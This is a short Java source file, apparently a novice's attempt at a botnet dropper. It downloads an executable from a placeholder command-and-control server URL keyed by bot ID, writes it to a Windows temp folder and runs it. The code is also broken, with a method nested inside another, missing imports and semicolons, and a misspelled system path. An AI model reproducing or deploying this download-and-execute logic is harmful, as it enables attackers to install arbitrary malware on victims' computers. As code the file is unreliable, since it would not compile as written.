//this should be interesting, first java program

public class main{

	public static void downloadAndExecuteCode() throws Exception {
		//downloading the executable from webserver, neeeds to be changed to real server
		try(
		  ReadableByteChannel in=Channels.newChannel(
		    new URL("http://<command and control server ip>/<bot_id>/commands/file.exe").openStream());
		  FileChannel out=new FileOutputStream(
		    "C:\\Winodws\\tmp\\file.exe").getChannel() ) {

		  out.transferFrom(in, 0, Long.MAX_VALUE); 
		}

		//use process builder to create process to run downloaded .exe
		//ProcessBuilder pb = new ProcessBuilder(pathToExe);
		//Map<String, String> env = pb.environment();

		//OR use ExecuteSystemCommand to run the command

		//List<String> command = new ArrayList<String>();
		//command.add("./file.exe")

		//OR use Process function, duh
		public static void main(String[] args) throws Exception {
			String[] cmd = { "C:\\Winodws\\tmp\\file.exe" }
			Process p = Runtime.getRuntime().exec(cmd);
			p.waitFor();
		}
	}
}

